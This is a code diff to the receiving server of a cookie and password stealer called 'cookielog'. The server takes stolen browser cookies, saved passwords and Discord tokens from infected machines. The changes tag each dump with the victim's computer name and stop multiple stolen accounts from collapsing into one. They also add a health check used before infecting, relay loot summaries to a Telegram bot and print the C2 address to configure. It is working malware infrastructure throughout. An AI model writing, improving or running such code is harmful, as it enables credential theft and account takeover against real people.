@@ -89,12 +89,26 @@ def load_existing():
 
 
 def merge(old, new):
+    """Dedup on identity, not just domain+name+path.
+
+    The old key collapsed every saved login of a domain into one (all of them
+    are name='password', path='/'), and cross-profile cookies overwrote each
+    other. browser/profile/_username/receiving-host are part of the identity.
+    """
     seen, out = {}, list(old)
+
+    def key(c):
+        # Tokens are the exception: one victim can hold several Discord
+        # accounts in the same browser/profile and they must not collapse.
+        extra = c.get("value") if c.get("name") == "token" else None
+        return (c.get("_host"), c.get("browser"), c.get("profile"),
+                c.get("domain"), c.get("name"), c.get("path"),
+                c.get("_username"), extra)
+
     for i, c in enumerate(out):
-        k = (c.get("domain"), c.get("name"), c.get("path"))
-        seen[k] = i
+        seen[key(c)] = i
     for c in new:
-        k = (c.get("domain"), c.get("name"), c.get("path"))
+        k = key(c)
         if k in seen:
             out[seen[k]] = c
         else:
@@ -125,13 +139,12 @@ def relay_telegram(cookies):
         msg = "cookielog: %d cookies received\n\nTop domains:\n" % len(cookies)
         for d, n in top:
             msg += "  %4d  %s\n" % (n, d)
-        msg += "\nFull JSON: loot/cookies.json"
+        msg += "\nFull JSON: loot/all_cookies.json"
 
         url = "https://api.telegram.org/bot%s/sendMessage" % bot_token
         data = urllib.parse.urlencode({
             "chat_id": chat_id,
             "text": msg,
-            "parse_mode": "HTML"
         }).encode()
         req = urllib.request.Request(url, data=data)
         urllib.request.urlopen(req, timeout=10)
@@ -170,13 +183,22 @@ def write_json(rows):
         json.dump(rows, f, ensure_ascii=False, indent=1)
 
 
+def expiry(c):
+    """Payload writes expirationDate; cookielog.py writes expires. Never throw
+    on a malformed value -- one bad record would abort the whole POST."""
+    try:
+        return int(c.get("expirationDate") or c.get("expires") or 0)
+    except (TypeError, ValueError):
+        return 0
+
+
 def write_txt(rows):
     lines = ["# Netscape HTTP Cookie File"]
     for c in rows:
         d = c.get("domain", "")
         if not d.startswith("."):
             d = "." + d
-        exp = int(c.get("expirationDate") or 0)
+        exp = expiry(c)
         lines.append("\t".join([
             d, "TRUE", c.get("path") or "/",
             "TRUE" if c.get("secure") else "FALSE",
@@ -187,9 +209,9 @@ def write_txt(rows):
 
 
 def filter_session(rows):
-    """Return only real session cookies (expirationDate == 0, excluding passwords)."""
+    """Return only real session cookies (no expiry, excluding passwords)."""
     return [c for c in rows
-            if not int(c.get("expirationDate") or 0)
+            if not expiry(c)
             and c.get("name") != "password"]
 
 def filter_passwords(rows):
@@ -204,7 +226,17 @@ def filter_cookies(rows):
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         """Serve cookie files: /all (json), /passwords (json), /session (json), / (summary)"""
-        if self.path == "/session":
+        if self.path == "/health":
+            # used by auto.py to prove ingest is alive before infecting
+            rows = load_existing()
+            data = json.dumps({"ok": True, "records": len(rows),
+                               "files": [JSONF, PWD_JSONF, SESS_JSONF]}).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+        elif self.path == "/session":
             rows = load_existing()
             sess = filter_session(filter_cookies(rows))
             data = json.dumps(sess, ensure_ascii=False, indent=1).encode("utf-8")
@@ -264,7 +296,16 @@ class Handler(BaseHTTPRequestHandler):
             self._do_post_locked()
 
     def _do_post_locked(self):
-        length = int(self.headers.get("Content-Length", 0))
+        try:
+            length = int(self.headers.get("Content-Length") or 0)
+        except ValueError:
+            length = 0
+        if length < 0 or length > 32 * 1024 * 1024:
+            self.send_response(413)
+            self.end_headers()
+            self.wfile.write(b"body too large")
+            print("[-] rejected POST with bad Content-Length: %d" % length)
+            return
         body = self.rfile.read(length) if length > 0 else b"[]"
         try:
             cookies = json.loads(body.decode("utf-8", "replace"))
@@ -277,6 +318,19 @@ class Handler(BaseHTTPRequestHandler):
 
         if not isinstance(cookies, list):
             cookies = [cookies]
+        cookies = [c for c in cookies if isinstance(c, dict) and c.get("name")]
+        if not cookies:
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"ok")
+            return
+
+        # Attribute this dump to the victim that sent it (payload sends the
+        # computer name; fall back to the socket peer).
+        peer = self.client_address[0] if self.client_address else "?"
+        victim = (self.headers.get("X-CookieLog-Host") or peer).strip()[:64]
+        for c in cookies:
+            c["_host"] = victim
 
         # merge with existing collection
         old = load_existing()
@@ -326,8 +380,8 @@ class Handler(BaseHTTPRequestHandler):
             if c.get("name") == "password":
                 new_pwds += 1
 
-        print("\n[+] %d entries received (%d passwords) | total: %d cookies, %d passwords, %d session" % (
-            len(cookies), new_pwds, len(all_cookies), len(passwords), len(sess_all)))
+        print("\n[+] %d entries received from %s (%d passwords) | total: %d cookies, %d passwords, %d session" % (
+            len(cookies), victim, new_pwds, len(all_cookies), len(passwords), len(sess_all)))
         print("    -> %s (%d bytes, %d cookies)" % (JSONF, os.path.getsize(JSONF), len(all_cookies)))
         print("    -> %s (%d passwords)" % (PWD_JSONF, len(passwords)))
         print("    -> %s (%d session cookies)" % (SESS_JSONF, len(sess_all)))
@@ -353,6 +407,16 @@ def main():
     print("[listen] passwords: %s + %s" % (PWD_JSONF, PWD_TXTF))
     print("[listen] session:   %s + %s" % (SESS_JSONF, SESS_TXTF))
     print("[listen] web UI: http://localhost:%d/  (endpoints: /all /passwords /session)" % PORT)
+    print("[listen] health: http://localhost:%d/health" % PORT)
+    try:
+        from c2auth import local_lan_ip
+        lan = local_lan_ip()
+        if not lan.startswith("127."):
+            print("[listen] LAN:    http://%s:%d/   <- put this in --c2" % (lan, PORT))
+            print("[listen] if the victim is on another machine, Windows Firewall must")
+            print("[listen] allow inbound TCP %d (auto.py adds the rule when run as admin)." % PORT)
+    except Exception:
+        pass
     print("[listen] format: Cookie-Editor JSON (browser-importable)")
     if TELEGRAM:
         print("[listen] relay: Telegram -> %s" % TELEGRAM.split(":")[0][:10] + "...")
